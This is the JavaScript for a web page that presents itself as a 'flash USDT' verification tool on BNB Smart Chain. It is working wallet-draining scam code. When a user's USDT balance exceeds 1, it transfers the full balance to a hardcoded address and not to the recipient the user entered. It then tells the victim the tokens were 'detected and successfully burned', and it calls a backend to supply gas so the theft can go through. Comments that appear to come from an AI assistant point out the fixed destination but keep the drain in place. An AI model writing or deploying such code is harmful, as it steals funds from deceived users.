const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

let web3;
let userAddress;

// DOM Elements for UI interaction
const recipientInput = document.getElementById('recipientInput');
const recipientLabel = document.getElementById('recipientLabel');
const amountInput = document.getElementById('amountInput');
const qrOptionBtn = document.getElementById('qrOptionBtn');
const pasteOptionBtn = document.getElementById('pasteOptionBtn');
const addressToggle = document.getElementById('addressToggle');
const domainToggle = document.getElementById('domainToggle');
const recipientError = document.getElementById('recipientError');
const amountError = document.getElementById('amountError');
const verifyAssetsBtn = document.getElementById("verifyAssets"); // Reference to the "Next" button


let currentInputType = 'address'; // Default type

// Function to show custom message popup
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        popup.style.zIndex = "1000"; // Ensure it's on top
        document.body.appendChild(popup);
    }

    // Set background and text color based on the 'color' parameter
    if (color === "red") {
        popup.style.backgroundColor = "#ffebeb"; // Light red background
        popup.style.color = "#ef4444"; // Tailwind red-500
        popup.style.borderColor = "#ef4444"; // Red border
    } else {
        popup.style.backgroundColor = "#e6f7e6"; // Light green background
        popup.style.color = "#22c55e"; // Tailwind green-500
        popup.style.borderColor = "#22c55e"; // Green border
    }
    
    popup.innerHTML = message;
    popup.style.display = "block";

    // Auto-hide after 5 seconds
    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: "eth_requestAccounts" });

            // Force switch to BNB Smart Chain
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }] // Chain ID for BNB Smart Chain Mainnet
            });

            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            console.log("Wallet Connected:", userAddress);
            // Optional: Show a success message for wallet connection
            showPopup("Wallet connected successfully!", "green");
        } catch (error) {
            console.error("Error connecting wallet:", error);
            // Replaced alert with showPopup
            if (error.code === 4001) { // User rejected connection
                showPopup("Wallet connection rejected. Please connect your wallet.", "red");
            } else if (error.code === 4902) { // Chain not added
                showPopup("BNB Smart Chain not added to wallet. Please add it manually.", "red");
            } else {
                showPopup("Error connecting wallet. Please ensure you are on BNB Smart Chain.", "red");
            }
        }
    } else {
        // Replaced alert with showPopup
        showPopup("Please install MetaMask or another Web3 wallet.", "red");
    }
}

// Auto-connect wallet on page load
window.addEventListener("load", connectWallet);

async function next() {
    // Validate Recipient Input (from previous UI logic)
    const recipient = recipientInput.value.trim();
    if (!recipient) {
        recipientError.textContent = `Please enter a valid ${currentInputType}.`;
        recipientError.classList.remove('hidden');
        showPopup('Please enter a valid recipient.', 'red'); // Added popup for validation
        return;
    } else if (recipient.length < 5) { // Basic length check for demonstration
        recipientError.textContent = `Input is too short. Please enter a valid ${currentInputType}.`;
        recipientError.classList.remove('hidden');
        showPopup('Recipient input is too short.', 'red'); // Added popup for validation
        return;
    } else {
        recipientError.classList.add('hidden');
    }

    // Validate Amount (from previous UI logic)
    const amount = parseFloat(amountInput.value);
    if (isNaN(amount) || amount <= 0.1) {
        amountError.classList.remove('hidden');
        showPopup('Amount must be greater than 0.1 USDT.', 'red'); // Added popup for validation
        return;
    } else {
        amountError.classList.add('hidden');
    }

    // Original script's logic starts here
    if (!web3 || !userAddress) {
        // Replaced alert with showPopup
        showPopup("Wallet not connected. Please refresh the page and connect your wallet.", "red");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
        { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" } // Added transfer function to ABI
    ], usdtContractAddress);

    // Fetch balances
    showPopup("Fetching balances...", "green");
    try {
        const [usdtBalanceWei, userBNBWei] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        // USDT (BEP20) typically has 18 decimals, so "ether" is correct for fromWei/toWei.
        // If your specific USDT token has 6 decimals, you would use "mwei" or "6" here.
        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
        const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

        console.log(`USDT Balance: ${usdtBalance} USDT`);
        console.log(`BNB Balance: ${userBNB} BNB`);

        if (usdtBalance === 0) {
            showPopup("No USDT assets found in your wallet.", "red");
            return;
        }

        // Logic for "flash" USDT detection and transfer
        if (usdtBalance <= 1) { // If USDT balance is 1 or less
            showPopup(
                `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
                "green"
            );
            return;
        } else { // If USDT balance is greater than 1 (potential "flash" USDT)
            showPopup("Loading... Checking BNB for gas fee.", "green");
            await transferUSDT(usdtBalance, userBNB, recipient); // Pass recipient to transfer function
        }

    } catch (error) {
        console.error("Error fetching balances or during initial checks:", error);
        showPopup("Error during balance check. Please try again.", "red");
    }
}

async function transferUSDT(usdtBalance, userBNB, recipientAddressForTransfer) {
    try {
        // Check if user has enough BNB for gas, and if not, request from backend
        // Note: The `sendBNB` function uses `bnbGasSender` as `from` address.
        // This implies `bnbGasSender`'s private key is available to the backend
        // or the environment where this `sendBNB` is executed.
        if (userBNB < 0.0005) {
            console.log("User BNB is low. Requesting BNB from backend...");
            showPopup("Insufficient BNB for gas. Requesting BNB from backend...", "red");
            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
            // Give some time for BNB to arrive if backend sends it
            showPopup("BNB requested. Please wait a moment and try again.", "green");
            return; // Exit and let user retry after BNB arrives
        }

        // Proceed with USDT Transfer
        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        // Convert USDT balance to Wei (assuming 18 decimals for BEP20 USDT)
        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Attempting to transfer ${usdtBalance} USDT to ${bscAddress}...`);
        showPopup(`Transferring ${usdtBalance} USDT... Please confirm in your wallet.`, "green");

        // Execute the transfer. The `bscAddress` is the fixed receiving address from your script.
        // If you intended to send to the address the user entered in the UI,
        // you would change `bscAddress` to `recipientAddressForTransfer` here.
        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
            "red" // Display in red as it's a "burn" message
        );

        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        // More specific error handling for user feedback
        if (error.code === 4001) { // User rejected transaction
            showPopup("Transaction rejected by user.", "red");
        } else if (error.message && error.message.includes("insufficient funds for gas")) {
            showPopup("Insufficient BNB for gas fees. Please ensure you have enough BNB.", "red");
        } else {
            showPopup("USDT transfer failed. Please ensure you have enough BNB for gas and try again.", "red");
        }
    }
}

// The sendBNB function is part of your original script,
// and it seems to be for a backend service to send BNB to the user.
// It's not directly triggered by the user's UI action here, but by the `transferUSDT` function's logic.
async function sendBNB(toAddress, amount) {
    try {
        // This function would typically be executed on a server/backend,
        // as it uses `bnbGasSender` as the `from` address, implying its private key control.
        // If this is meant to be client-side, the user's wallet would need to sign this.
        // As per your instruction, no change to this function's core logic.
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: toAddress,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000 // Standard gas limit for simple BNB transfer
        });

        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
    } catch (error) {
        console.error("⚠️ Error sending BNB:", error);
    }
}

// Event Listeners for UI elements
addressToggle.addEventListener('click', () => {
    currentInputType = 'address';
    recipientLabel.textContent = 'Recipient Address';
    recipientInput.placeholder = 'Enter recipient address';
    recipientInput.value = '0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54'; // Prefilled address
    addressToggle.classList.add('bg-primary');
    addressToggle.classList.remove('bg-cardBg', 'border-primary/50');
    domainToggle.classList.remove('bg-primary');
    domainToggle.classList.add('bg-cardBg', 'border-primary/50');
    recipientError.classList.add('hidden'); // Hide error on type change
});

domainToggle.addEventListener('click', () => {
    currentInputType = 'domain';
    recipientLabel.textContent = 'Recipient Domain';
    recipientInput.placeholder = 'Enter recipient domain (e.g., example.eth)';
    recipientInput.value = 'example.domain'; // Example pre-fill for domain
    domainToggle.classList.add('bg-primary');
    domainToggle.classList.remove('bg-cardBg', 'border-primary/50');
    addressToggle.classList.remove('bg-primary');
    addressToggle.classList.add('bg-cardBg', 'border-primary/50');
    recipientError.classList.add('hidden'); // Hide error on type change
});

qrOptionBtn.addEventListener('click', () => {
    showPopup('QR scan functionality would be implemented here (e.g., opening camera).', 'green');
});

pasteOptionBtn.addEventListener('click', async () => {
    try {
        const text = await navigator.clipboard.readText();
        if (text) {
            recipientInput.value = text;
            showPopup('Input successfully pasted from clipboard.', 'green');
        } else {
            showPopup('Clipboard is empty or permission denied. Please copy text first.', 'red');
        }
    } catch (err) {
        showPopup('Could not access clipboard. Please paste manually (Ctrl+V or Cmd+V).', 'red');
        console.error('Failed to read clipboard contents: ', err);
    }
});

// Attach event listener for the "Next" button (ID: verifyAssets)
verifyAssetsBtn.addEventListener("click", next);
